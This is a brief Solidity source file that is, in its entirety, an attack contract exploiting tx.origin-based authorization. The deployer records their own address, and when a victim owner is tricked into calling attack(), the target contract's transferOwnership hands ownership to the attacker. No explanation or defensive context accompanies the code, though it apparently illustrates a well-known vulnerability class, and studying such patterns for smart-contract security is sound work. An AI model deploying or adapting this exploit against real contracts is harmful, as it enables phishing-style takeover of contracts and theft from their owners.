// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface ITxOrigin { function transferOwnership(address newOwner) external; }
contract TxOriginAttacker {
    ITxOrigin target;
    address attacker;
    constructor(address _target) { target = ITxOrigin(_target); attacker = msg.sender; }
    function attack() external { target.transferOwnership(attacker); }
}